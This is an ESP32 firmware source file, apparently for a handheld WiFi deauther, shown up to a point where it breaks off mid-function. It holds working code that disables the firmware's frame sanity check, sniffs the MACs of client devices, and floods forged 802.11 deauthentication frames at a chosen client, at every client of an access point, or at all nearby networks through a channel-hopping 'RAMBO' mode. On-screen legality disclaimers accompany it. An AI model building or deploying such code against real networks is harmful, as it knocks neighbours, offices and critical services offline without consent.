#include "Deauther.h"
#include "DisplayTFT.h"
#include <WiFi.h>
#include "esp_wifi.h"
#include "PepeDraw.h"
#include "Pins.h"
#include "SoundUtils.h"

extern DisplayTFT tft;
// ═══════════════════════════════════════════════════════════════════════════
//  PATCH · anula la validacion de frames 802.11
//  Este override solo funciona si se aplico el comando objcopy --weaken-symbol
//  sobre libnet80211.a (ver README del proyecto)
// ═══════════════════════════════════════════════════════════════════════════
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg,
                                                 int32_t arg2,
                                                 int32_t arg3) {
    return 0;   // siempre permitir
}

// ═══════════════════════════════════════════════════════════════════════════
//  CONFIGURACIÓN
// ═══════════════════════════════════════════════════════════════════════════
#define MAX_APS             30
#define MAX_CLIENTS         15
#define VISIBLE_ROWS        5
#define AP_SCAN_TIME_S      10
#define CLIENT_SCAN_TIME_S  15

// ═══════════════════════════════════════════════════════════════════════════
//  ESTRUCTURAS
// ═══════════════════════════════════════════════════════════════════════════
struct APInfo {
    String   ssid;
    uint8_t  bssid[6];
    int      channel;
    int      rssi;
    String   bssidStr;
};

struct ClientInfo {
    uint8_t  mac[6];
    String   macStr;
    int      rssi;
    unsigned long lastSeen;
};

static APInfo     aps[MAX_APS];
static int        apCount = 0;
static ClientInfo clients[MAX_CLIENTS];
static int        clientCount = 0;

// Estado del ataque
static volatile unsigned long deauthPackets = 0;
static APInfo     activeAP;
static uint8_t    activeTargetMac[6];
static bool       broadcastMode = false;    // true = todos los clientes del AP
static bool       ramboMode     = false;    // true = TODAS las APs (channel hop)

// ═══════════════════════════════════════════════════════════════════════════
//  DEAUTH FRAME TEMPLATE
//  Frame Control: type=Management (0x00), subtype=Deauthentication (0x0C)
//  → primer byte = 0xC0 (subtype deauth + management)
// ═══════════════════════════════════════════════════════════════════════════
static uint8_t deauthFrame[26] = {
    0xC0, 0x00,                          // Frame Control: deauth
    0x00, 0x00,                          // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (se llena dinámico)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (BSSID del AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (del AP)
    0x00, 0x00,                          // Sequence
    0x07, 0x00                           // Reason code 7 = Class 3 frame
};

// ═══════════════════════════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════════════════════════

// Formatea 6 bytes como "AA:BB:CC:DD:EE:FF"
static String macToStr(const uint8_t mac[6]) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

static int rssiBars(int rssi) {
    if (rssi >= -55) return 4;
    if (rssi >= -70) return 3;
    if (rssi >= -85) return 2;
    if (rssi >= -95) return 1;
    return 0;
}

static String formatTime(unsigned long ms) {
    unsigned long s = ms / 1000;
    unsigned long h = s / 3600;
    unsigned long m = (s % 3600) / 60;
    unsigned long sec = s % 60;
    char buf[12];
    snprintf(buf, sizeof(buf), "%02lu:%02lu:%02lu", h, m, sec);
    return String(buf);
}

// Envía 1 deauth frame con el target, BSSID y reason especificados
static void sendDeauth(const uint8_t target[6], const uint8_t bssid[6]) {
    memcpy(&deauthFrame[4],  target, 6);   // destination
    memcpy(&deauthFrame[10], bssid,  6);   // source (BSSID)
    memcpy(&deauthFrame[16], bssid,  6);   // BSSID
    esp_wifi_80211_tx(WIFI_IF_STA, deauthFrame, sizeof(deauthFrame), false);
    deauthPackets++;
}

// ═══════════════════════════════════════════════════════════════════════════
//  DISCLAIMER REFORZADO
// ═══════════════════════════════════════════════════════════════════════════
static bool showDisclaimer() {
    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, TFT_RED);
    tft.drawRect(1, 1, 318, 238, TFT_RED);

    drawStringBig(70, 8, "DEAUTHER", TFT_RED, 2);
    tft.drawFastHLine(0, 46, 320, TFT_RED);

    int y = 54;
    drawStringCustom(10, y, "Esta herramienta desconecta",   UI_MAIN, 1); y += 12;
    drawStringCustom(10, y, "dispositivos de su red WiFi.",  UI_MAIN, 1); y += 20;

    drawStringCustom(10, y, "USO LEGAL:",                     TFT_GREEN, 1); y += 12;
    drawStringCustom(20, y, "- Tu red propia",                UI_ACCENT, 1); y += 12;
    drawStringCustom(20, y, "- Red con permiso del dueño",    UI_ACCENT, 1); y += 18;

    drawStringCustom(10, y, "USO ILEGAL:",                    TFT_RED, 1); y += 12;
    drawStringCustom(20, y, "- Redes ajenas sin permiso",     UI_ACCENT, 1); y += 12;
    drawStringCustom(20, y, "- Servicios criticos / medicos", UI_ACCENT, 1); y += 12;
    drawStringCustom(20, y, "- Empresas / gobierno",          UI_ACCENT, 1); y += 18;

    drawStringCustom(10, y, "Violacion = delito federal.",    TFT_RED, 1);

    tft.drawFastHLine(0, 212, 320, TFT_RED);
    drawStringCustom(10, 220, "OK: ENTIENDO   UP/DN: SALIR",  UI_ACCENT, 1);

    while (true) {
        if (navEnterPressed()) {
            beep(2200, 60);
            while (navEnterPressed()) delay(5);
            delay(100);
            return true;
        }
        if (navUpPressed() || navDownPressed()) {
            beep(800, 100);
            while (navUpPressed() || navDownPressed())
                delay(5);
            delay(100);
            return false;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  SCAN DE APs
// ═══════════════════════════════════════════════════════════════════════════
static void scanAPs() {
    apCount = 0;

    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, UI_MAIN);
    drawStringBig(10, 8, "DEAUTHER", UI_MAIN, 1);
    tft.drawFastHLine(0, 30, 320, UI_ACCENT);

    drawStringCustom(10, 50, "Scanning APs...", UI_MAIN, 1);
    drawStringCustom(10, 62, String(AP_SCAN_TIME_S) + " seconds", UI_ACCENT, 1);

    int barX = 10, barY = 90, barW = 300, barH = 14;
    tft.drawRect(barX, barY, barW, barH, UI_ACCENT);

    // WiFi scan estándar (modo STA)
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);

    // Scan asíncrono
    WiFi.scanNetworks(true, true);   // async, show_hidden

    unsigned long scanStart = millis();
    int lastCount = 0;

    while (millis() - scanStart < AP_SCAN_TIME_S * 1000UL) {
        int status = WiFi.scanComplete();
        if (status >= 0 && status != lastCount) {
            lastCount = status;
        }

        float progress = (float)(millis() - scanStart) / (AP_SCAN_TIME_S * 1000.0f);
        int fillW = (int)((barW - 2) * progress);
        tft.fillRect(barX + 1, barY + 1, fillW, barH - 2, UI_SELECT);

        tft.fillRect(10, 115, 200, 12, TFT_BLACK);
        drawStringCustom(10, 115, "FOUND: " + String(lastCount), TFT_GREEN, 2);

        delay(100);
    }

    // Esperar a que termine si aún está corriendo
    int n = WiFi.scanComplete();
    while (n == WIFI_SCAN_RUNNING) {
        delay(100);
        n = WiFi.scanComplete();
    }

    if (n < 0) n = 0;
    if (n > MAX_APS) n = MAX_APS;

    // Copiar resultados
    for (int i = 0; i < n; i++) {
        aps[i].ssid    = WiFi.SSID(i);
        aps[i].rssi    = WiFi.RSSI(i);
        aps[i].channel = WiFi.channel(i);

        uint8_t* b = WiFi.BSSID(i);
        if (b) {
            memcpy(aps[i].bssid, b, 6);
            aps[i].bssidStr = macToStr(aps[i].bssid);
        }

        if (aps[i].ssid.length() == 0) aps[i].ssid = "<hidden>";
    }
    apCount = n;

    WiFi.scanDelete();

    // Ordenar por RSSI desc
    for (int i = 0; i < apCount - 1; i++) {
        for (int j = 0; j < apCount - 1 - i; j++) {
            if (aps[j].rssi < aps[j + 1].rssi) {
                APInfo tmp = aps[j];
                aps[j] = aps[j + 1];
                aps[j + 1] = tmp;
            }
        }
    }

    beep(2000, 40);
    delay(20);
    beep(2400, 60);
}

// ═══════════════════════════════════════════════════════════════════════════
//  SELECCIÓN DE AP (+ Rambo + Rescan + Back)
// ═══════════════════════════════════════════════════════════════════════════
static void drawAPList(int cursor, int scrollOffset) {
    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, UI_MAIN);

    drawStringBig(10, 8, "SELECT AP", UI_MAIN, 1);
    drawStringCustom(230, 12, "[" + String(apCount) + " APs]", UI_ACCENT, 1);
    tft.drawFastHLine(0, 30, 320, UI_ACCENT);

    // Items: RAMBO (0), APs (1..apCount), RESCAN, BACK
    int totalItems = apCount + 2;
    const int rowH = 32;
    const int listY = 36;

    for (int i = 0; i < VISIBLE_ROWS; i++) {
        int idx = i + scrollOffset;
        if (idx >= totalItems) break;

        int y = listY + i * rowH;
        bool selected = (idx == cursor);

        if (selected) tft.fillRect(5, y, 310, rowH - 2, UI_SELECT);

        uint16_t colMain = selected ? UI_BG : UI_MAIN;
        uint16_t colSub  = selected ? UI_BG : UI_ACCENT;

        if (idx == 0) {
            // RAMBO MODE
            drawStringCustom(10, y + 6,  "[!] RAMBO: ATTACK ALL APs",
                             selected ? UI_BG : TFT_RED, 2);
            drawStringCustom(10, y + 20, "Agresivo - ver disclaimer",
                             colSub, 1);
        } else if (idx == apCount + 1) {
            drawStringCustom(10, y + 10, "< RESCAN", colMain, 2);
        } else {
            int apIdx = idx - 1;
            APInfo& a = aps[apIdx];

            String s = a.ssid;
            if (getTextWidth(s, 2) <= 260) {
                drawStringCustom(10, y + 4, s, colMain, 2);
            } else {
                drawStringFit(10, y + 8, s, colMain, 260, 1);
            }

            String meta = "CH" + String(a.channel) + " " +
                          String(a.rssi) + "dBm";
            drawStringCustom(10, y + 20, meta, colSub, 1);

            // Bars
            int bars = rssiBars(a.rssi);
            int bx = 285, by = 24;
            for (int b = 0; b < 4; b++) {
                int bh = 3 + b * 2;
                uint16_t c = (b < bars)
                    ? (selected ? UI_BG : (bars >= 3 ? TFT_GREEN :
                                           bars >= 2 ? TFT_YELLOW : TFT_ORANGE))
                    : (selected ? UI_BG : UI_ACCENT);
                if (b < bars) tft.fillRect(bx + b*5, by - bh, 3, bh, c);
                else          tft.drawRect(bx + b*5, by - bh, 3, bh, c);
            }
        }
    }

    // Scroll bar
    if (totalItems > VISIBLE_ROWS) {
        int barH = (VISIBLE_ROWS * 176) / totalItems;
        int barY = 36 + (scrollOffset * (176 - barH)) / (totalItems - VISIBLE_ROWS);
        tft.fillRect(314, barY, 4, barH, UI_ACCENT);
    }

    tft.drawFastHLine(0, 215, 320, UI_ACCENT);
    drawStringCustom(10, 222, "OK:SELECT  OK(HOLD):BACK", UI_ACCENT, 1);
}

// Devuelve:
//   -3 = BACK, -2 = RESCAN, -1 = RAMBO, 0..apCount-1 = AP index
static int selectAP() {
    int cursor = 1;   // iniciar en el primer AP real, no en RAMBO
    int scrollOffset = 0;
    int totalItems = apCount + 2;

    drawAPList(cursor, scrollOffset);

    while (true) {
        if (navUpPressed()) {
            cursor = (cursor - 1 + totalItems) % totalItems;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20);
            drawAPList(cursor, scrollOffset);
            delay(180);
        }
        if (navDownPressed()) {
            cursor = (cursor + 1) % totalItems;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20);
            drawAPList(cursor, scrollOffset);
            delay(180);
        }
        if (navEnterPressed()) {
            bool held = waitOkReleaseWasLong();
            beep(held ? 1000 : 1800, 40);
            delay(100);
            if (held) return -3;

            if (cursor == 0)              return -1;   // RAMBO
            if (cursor == apCount + 1)    return -2;   // RESCAN
            return cursor - 1;                          // índice AP real
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  RAMBO DISCLAIMER (extra warning)
// ═══════════════════════════════════════════════════════════════════════════
static bool confirmRambo() {
    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, TFT_RED);
    tft.drawRect(1, 1, 318, 238, TFT_RED);

    drawStringBig(60, 10, "RAMBO MODE", TFT_RED, 2);
    tft.drawFastHLine(0, 48, 320, TFT_RED);

    int y = 58;
    drawStringCustom(10, y, "Atacara TODAS las redes WiFi",   UI_MAIN, 1); y += 12;
    drawStringCustom(10, y, "cercanas simultaneamente.",       UI_MAIN, 1); y += 20;

    drawStringCustom(10, y, "Rota canales 1, 6 y 11.",         UI_ACCENT, 1); y += 20;

    drawStringCustom(10, y, "!! ESTO AFECTA A TERCEROS !!",    TFT_RED, 1); y += 12;
    drawStringCustom(10, y, "!! VECINOS, OFICINAS, ETC !!",    TFT_RED, 1); y += 20;

    drawStringCustom(10, y, "Solo usar en tu propio",          UI_MAIN, 1); y += 12;
    drawStringCustom(10, y, "espacio fisico aislado.",         UI_MAIN, 1); y += 20;

    drawStringCustom(10, y, "Responsabilidad 100% tuya.",      TFT_YELLOW, 1);

    tft.drawFastHLine(0, 212, 320, TFT_RED);
    drawStringCustom(10, 220, "OK: CONTINUAR   UP/DN: CANCEL", UI_ACCENT, 1);

    while (true) {
        if (navEnterPressed()) {
            beep(2200, 60);
            while (navEnterPressed()) delay(5);
            delay(100);
            return true;
        }
        if (navUpPressed() || navDownPressed()) {
            beep(800, 100);
            while (navUpPressed() || navDownPressed())
                delay(5);
            delay(100);
            return false;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  MENÚ DE ACCIÓN (después de seleccionar AP)
//  Broadcast now | Scan clients | Back
// ═══════════════════════════════════════════════════════════════════════════
static void drawActionMenu(int cursor, const APInfo& ap) {
    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, UI_MAIN);

    drawStringBig(10, 8, "ACTION", UI_MAIN, 1);
    tft.drawFastHLine(0, 30, 320, UI_ACCENT);

    // AP info
    drawStringFit(10, 38, "AP: " + ap.ssid, UI_SELECT, 300, 1);
    drawStringCustom(10, 50, "BSSID: " + ap.bssidStr, UI_ACCENT, 1);
    drawStringCustom(10, 62, "Channel: " + String(ap.channel) + "  RSSI: " +
                     String(ap.rssi) + "dBm", UI_ACCENT, 1);
    tft.drawFastHLine(0, 75, 320, UI_ACCENT);

    // 3 opciones
    const char* items[] = {
        "Broadcast Deauth NOW",
        "Scan Clients (15s)"
    };
    const char* descs[] = {
        "Desconecta a todos",
        "Selecciona target fino",
        ""
    };

    for (int i = 0; i < 2; i++) {
        int y = 85 + i * 32;
        bool selected = (i == cursor);

        if (selected) tft.fillRect(5, y - 2, 310, 28, UI_SELECT);

        uint16_t colMain = selected ? UI_BG : UI_MAIN;
        uint16_t colSub  = selected ? UI_BG : UI_ACCENT;

        drawStringCustom(15, y + 2,  items[i], colMain, 2);
        if (strlen(descs[i]) > 0) {
            drawStringCustom(15, y + 18, descs[i], colSub, 1);
        }
    }

    tft.drawFastHLine(0, 215, 320, UI_ACCENT);
    drawStringCustom(10, 222, "OK:SELECT  OK(HOLD):BACK", UI_ACCENT, 1);
}

// Devuelve: 0=broadcast, 1=scan clients, -1=back
static int selectAction(const APInfo& ap) {
    int cursor = 0;
    drawActionMenu(cursor, ap);

    while (true) {
        if (navUpPressed()) {
            cursor = (cursor - 1 + 2) % 2;
            beep(2100, 20);
            drawActionMenu(cursor, ap);
            delay(180);
        }
        if (navDownPressed()) {
            cursor = (cursor + 1) % 2;
            beep(2100, 20);
            drawActionMenu(cursor, ap);
            delay(180);
        }
        if (navEnterPressed()) {
            bool held = waitOkReleaseWasLong();
            beep(held ? 1000 : 1800, 40);
            delay(100);
            if (held) return -1;
            return cursor;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  SCAN DE CLIENTES (modo promiscuo filtrando por BSSID del AP)
// ═══════════════════════════════════════════════════════════════════════════
static uint8_t scanTargetBSSID[6];

static void clientSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    if (clientCount >= MAX_CLIENTS) return;

    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t* payload = pkt->payload;

    // En frames data:
    //   bytes 4-9   = destination (addr1)
    //   bytes 10-15 = source (addr2)
    //   bytes 16-21 = BSSID (addr3)
    // Los clientes son dispositivos donde su MAC aparece como src/dst
    // y el BSSID coincide con el AP target

    uint8_t* addr1 = &payload[4];
    uint8_t* addr2 = &payload[10];
    uint8_t* addr3 = &payload[16];

    uint8_t* clientMac = nullptr;

    // Frame del cliente al AP (addr3 = BSSID = AP, addr2 = cliente)
    if (memcmp(addr3, scanTargetBSSID, 6) == 0 &&
        memcmp(addr2, scanTargetBSSID, 6) != 0) {
        clientMac = addr2;
    }
    // Frame del AP al cliente (addr2 = AP, addr1 = cliente)
    else if (memcmp(addr2, scanTargetBSSID, 6) == 0 &&
             memcmp(addr1, scanTargetBSSID, 6) != 0 &&
             addr1[0] != 0xFF) {  // no broadcast
        clientMac = addr1;
    }

    if (!clientMac) return;

    // Filtrar multicast
    if (clientMac[0] & 0x01) return;

    // Buscar si ya está
    for (int i = 0; i < clientCount; i++) {
        if (memcmp(clients[i].mac, clientMac, 6) == 0) {
            clients[i].rssi = pkt->rx_ctrl.rssi;
            clients[i].lastSeen = millis();
            return;
        }
    }

    // Agregar nuevo
    memcpy(clients[clientCount].mac, clientMac, 6);
    clients[clientCount].macStr = macToStr(clientMac);
    clients[clientCount].rssi   = pkt->rx_ctrl.rssi;
    clients[clientCount].lastSeen = millis();
    clientCount++;
}

static void scanClients(const APInfo& ap) {
    clientCount = 0;
    memcpy(scanTargetBSSID, ap.bssid, 6);

    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, UI_MAIN);
    drawStringBig(10, 8, "SCAN CLIENTS", UI_MAIN, 1);
    tft.drawFastHLine(0, 30, 320, UI_ACCENT);

    drawStringCustom(10, 40, "AP: " + ap.ssid, UI_SELECT, 1);
    drawStringCustom(10, 52, "CH " + String(ap.channel) +
                             "  -  " + String(CLIENT_SCAN_TIME_S) + "s sniff",
                     UI_ACCENT, 1);

    int barX = 10, barY = 80, barW = 300, barH = 14;
    tft.drawRect(barX, barY, barW, barH, UI_ACCENT);

    // Setup promiscuous mode en el canal del AP
    WiFi.mode(WIFI_MODE_NULL);
    delay(50);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&clientSnifferCallback);

    unsigned long scanStart = millis();
    int lastDrawnCount = -1;

    while (millis() - scanStart < CLIENT_SCAN_TIME_S * 1000UL) {
        float progress = (float)(millis() - scanStart) /
                         (CLIENT_SCAN_TIME_S * 1000.0f);
        int fillW = (int)((barW - 2) * progress);
        tft.fillRect(barX + 1, barY + 1, fillW, barH - 2, UI_SELECT);

        // Redibujar lista de clientes si cambió
        if (clientCount != lastDrawnCount) {
            tft.fillRect(10, 105, 300, 100, TFT_BLACK);
            drawStringCustom(10, 105, "Clients: " + String(clientCount),
                             TFT_GREEN, 2);

            int yy = 125;
            int show = clientCount;
            if (show > 5) show = 5;
            for (int i = 0; i < show; i++) {
                String line = "- " + clients[i].macStr +
                              " (" + String(clients[i].rssi) + ")";
                drawStringCustom(10, yy, line, UI_ACCENT, 1);
                yy += 12;
            }
            if (clientCount > 5) {
                drawStringCustom(10, yy, "...+" + String(clientCount - 5) +
                                 " more", UI_ACCENT, 1);
            }

            lastDrawnCount = clientCount;
        }

        delay(150);
    }

    // Cleanup
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(100);

    // Ordenar por RSSI desc
    for (int i = 0; i < clientCount - 1; i++) {
        for (int j = 0; j < clientCount - 1 - i; j++) {
            if (clients[j].rssi < clients[j + 1].rssi) {
                ClientInfo tmp = clients[j];
                clients[j] = clients[j + 1];
                clients[j + 1] = tmp;
            }
        }
    }

    beep(2000, 40);
    delay(20);
    beep(2400, 60);
}

// ═══════════════════════════════════════════════════════════════════════════
//  SELECCIÓN DE TARGET (cliente o ALL)
// ═══════════════════════════════════════════════════════════════════════════
static void drawClientList(int cursor, int scrollOffset) {
    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, UI_MAIN);

    drawStringBig(10, 8, "SELECT TARGET", UI_MAIN, 1);
    drawStringCustom(230, 12, "[" + String(clientCount) + " clients]",
                     UI_ACCENT, 1);
    tft.drawFastHLine(0, 30, 320, UI_ACCENT);

    // Items: ALL_CLIENTS (0), clients (1..clientCount), RESCAN
    int totalItems = clientCount + 2;
    const int rowH = 28;
    const int listY = 36;

    for (int i = 0; i < VISIBLE_ROWS + 1; i++) {
        int idx = i + scrollOffset;
        if (idx >= totalItems) break;

        int y = listY + i * rowH;
        bool selected = (idx == cursor);

        if (selected) tft.fillRect(5, y, 310, rowH - 2, UI_SELECT);

        uint16_t colMain = selected ? UI_BG : UI_MAIN;
        uint16_t colSub  = selected ? UI_BG : UI_ACCENT;

        if (idx == 0) {
            drawStringCustom(10, y + 4, "ALL CLIENTS", colMain, 2);
            drawStringCustom(10, y + 18, "Broadcast deauth (FF:FF:FF..)",
                             colSub, 1);
        } else if (idx == clientCount + 1) {
            drawStringCustom(10, y + 7, "< RESCAN", colMain, 2);
        } else {
            int cIdx = idx - 1;
            ClientInfo& c = clients[cIdx];
            drawStringCustom(10, y + 4, c.macStr, colMain, 2);
            drawStringCustom(10, y + 18, String(c.rssi) + " dBm",
                             colSub, 1);

            int bars = rssiBars(c.rssi);
            int bx = 280, by = 20;
            for (int b = 0; b < 4; b++) {
                int bh = 3 + b * 2;
                uint16_t col = (b < bars)
                    ? (selected ? UI_BG : (bars >= 3 ? TFT_GREEN :
                                           bars >= 2 ? TFT_YELLOW : TFT_ORANGE))
                    : (selected ? UI_BG : UI_ACCENT);
                if (b < bars) tft.fillRect(bx + b*5, by - bh, 3, bh, col);
                else          tft.drawRect(bx + b*5, by - bh, 3, bh, col);
            }
        }
    }

    tft.drawFastHLine(0, 215, 320, UI_ACCENT);
    drawStringCustom(10, 222, "OK:DEAUTH  OK(HOLD):BACK", UI_ACCENT, 1);
}

// Devuelve: -3=BACK, -2=RESCAN, -1=ALL, 0..clientCount-1 = client
static int selectTarget() {
    int cursor = 0;
    int scrollOffset = 0;
    int totalItems = clientCount + 2;

    drawClientList(cursor, scrollOffset);

    while (true) {
        if (navUpPressed()) {
            cursor = (cursor - 1 + totalItems) % totalItems;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20);
            drawClientList(cursor, scrollOffset);
            delay(180);
        }
        if (navDownPressed()) {
            cursor = (cursor + 1) % totalItems;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20);
            drawClientList(cursor, scrollOffset);
            delay(180);
        }
        if (navEnterPressed()) {
            bool held = waitOkReleaseWasLong();
            beep(held ? 1000 : 1800, 40);
            delay(100);
            if (held) return -3;

            if (cursor == 0)              return -1;   // ALL
            if (cursor == clientCount + 1) return -2;  // RESCAN
            return cursor - 1;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  PANTALLA DE ATAQUE
// ═══════════════════════════════════════════════════════════════════════════
static void drawAttackFrame() {
    tft.fillScreen(TFT_BLACK);
    tft.drawRect(0, 0, 320, 240, TFT_RED);
    tft.drawRect(1, 1, 318, 238, TFT_RED);

    drawStringBig(10, 10, "DEAUTHING", TFT_RED, 1);
    drawStringCustom(225, 16, "[ACTIVE]", TFT_GREEN, 1);
    tft.drawFastHLine(0, 36, 320, TFT_RED);

    // Info
    if (ramboMode) {
        drawStringCustom(10, 44, "Mode:   RAMBO (all APs)", UI_MAIN, 1);
        drawStringCustom(10, 58, "Channels: 1 / 6 / 11 hop", UI_MAIN, 1);
        drawStringCustom(10, 72, "Targets: broadcast",       UI_MAIN, 1);
    } else {
        String s = activeAP.ssid;
        drawStringFit(10, 44, "AP:     " + s, UI_MAIN, 300, 1);
        if (broadcastMode) {
            drawStringCustom(10, 58, "Target: ALL (broadcast)", UI_MAIN, 1);
        } else {
            drawStringCustom(10, 58, "Target: " + macToStr(activeTargetMac),
                             UI_MAIN, 1);
        }
        drawStringCustom(10, 72, "Channel: " + String(activeAP.channel),
                         UI_MAIN, 1);
    }

    tft.drawFastHLine(10, 86, 300, UI_ACCENT);

    drawStringCustom(10, 100, "Time:",    UI_ACCENT, 1);
    drawStringCustom(10, 128, "Packets:", UI_ACCENT, 1);
    drawStringCustom(10, 156, "Rate:",    UI_ACCENT, 1);

    tft.drawRect(10, 185, 300, 14, UI_ACCENT);

    tft.drawFastHLine(0, 212, 320, TFT_RED);
    drawStringCustom(10, 220, "OK (HOLD): STOP", TFT_RED, 1);
}

static void drawAttackStats(unsigned long elapsed, unsigned long pkts,
                            float rate) {
    tft.fillRect(100, 96, 210, 14, TFT_BLACK);
    drawStringCustom(100, 100, formatTime(elapsed), TFT_YELLOW, 2);

    tft.fillRect(100, 124, 210, 14, TFT_BLACK);
    drawStringCustom(100, 128, String(pkts), TFT_GREEN, 2);

    tft.fillRect(100, 152, 210, 14, TFT_BLACK);
    char rbuf[24];
    snprintf(rbuf, sizeof(rbuf), "%d pkt/s", (int)rate);
    drawStringCustom(100, 156, String(rbuf), TFT_CYAN, 2);

    tft.fillRect(12, 187, 296, 10, TFT_BLACK);
    int fillW = random(60, 290);
    tft.fillRect(12, 187, fillW, 10, TFT_RED);
}

// ═══════════════════════════════════════════════════════════════════════════
//  LOOP DE ATAQUE
// ═══════════════════════════════════════════════════════════════════════════
static void runAttackLoop() {
    drawAttackFrame();
    beep(3000, 40); delay(20);
    beep(3600, 60); delay(20);
    beep(2400, 80);

    // ── Setup WiFi para raw tx ──────────────────────────────────────────
    WiFi.mode(WIFI_MODE_NULL);
    delay(50);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);

    // En modo Rambo rotamos canales, si no, fijamos uno
    const int ramboChannels[] = {1, 6, 11};
    int ramboIdx = 0;

    if (!ramboMode) {
        esp_wifi_set_channel(activeAP.channel, WIFI_SECOND_CHAN_NONE);
    } else {
        esp_wifi_set_channel(ramboChannels[0], WIFI_SECOND_CHAN_NONE);
    }

    deauthPackets = 0;
    unsigned long startMs         = millis();
    unsigned long lastStatsUpdate = millis();
    unsigned long lastChannelHop  = millis();
    unsigned long lastPktCount    = 0;
    float rate = 0;

    const uint8_t broadcastMac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

    bool stopAttack = false;
    unsigned long okPressStart = 0;
    bool okHeld = false;

    while (!stopAttack) {
        // ── Enviar deauth(s) ───────────────────────────────────────────
        if (ramboMode) {
            // Atacar a cada AP que coincida con el canal actual
            int curChan = ramboChannels[ramboIdx];
            for (int i = 0; i < apCount; i++) {
                if (aps[i].channel == curChan) {
                    // Broadcast deauth: source=BSSID del AP, dest=FF:FF:..
                    sendDeauth(broadcastMac, aps[i].bssid);
                    // También deauth en sentido inverso (AP → cliente)
                    // para tirar la conexión desde ambos lados
                    sendDeauth(aps[i].bssid, aps[i].bssid);
                }
            }
        } else {
            const uint8_t* targetMac = broadcastMode ? broadcastMac
                                                      : activeTargetMac;
            sendDeauth(targetMac, activeAP.bssid);
            // Reverse deauth también
            if (!broadcastMode) {
                sendDeauth(activeAP.bssid, activeAP.bssid);
            }
        }

        // ── Channel hop cada 500ms en Rambo ────────────────────────────
        if (ramboMode && millis() - lastChannelHop > 500) {
            ramboIdx = (ramboIdx + 1) % 3;
            esp_wifi_set_channel(ramboChannels[ramboIdx],
                                 WIFI_SECOND_CHAN_NONE);
            lastChannelHop = millis();
        }

        // ── Update UI cada 250 ms ──────────────────────────────────────
        if (millis() - lastStatsUpdate > 250) {
            unsigned long now   = millis();
            unsigned long delta = deauthPackets - lastPktCount;
            unsigned long dt    = now - lastStatsUpdate;
            rate = (delta * 1000.0f) / dt;
            lastPktCount    = deauthPackets;
            lastStatsUpdate = now;

            drawAttackStats(now - startMs, deauthPackets, rate);
        }

        // ── Detectar OK HOLD ───────────────────────────────────────────
        if (navEnterPressed()) {
            if (!okHeld) {
                okPressStart = millis();
                okHeld = true;
            } else if (millis() - okPressStart > 500) {
                stopAttack = true;
            }
        } else {
            okHeld = false;
        }

        yield();
        delay(15);
    }

    // ── Cleanup ─────────────────────────────────────────────────────────
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(100);

    beep(1800, 40); delay(20);
    beep(1200, 60);

    while (navEnterPressed()) delay(5);
    delay(150);
}

// ═══════════════════════════════════════════════════════════════════════════
//  MAIN
// ═══════════════════════════════════════════════════════════════════════════
void runDeauther() {
    // Esperar liberación de OK
    while (navEnterPressed()) delay(5);
    delay(100);

    // 1. Disclaimer principal
    if (!showDisclaimer()) return;

    // Loop principal
    while (true) {
        // 2. Scan APs si no hay
        if (apCount == 0) scanAPs();

        if (apCount == 0) {
            tft.fillScreen(TFT_BLACK);
            tft.drawRect(0, 0, 320, 240, UI_MAIN);
            drawStringBig(35, 90, "NO APs FOUND", TFT_RED, 1);
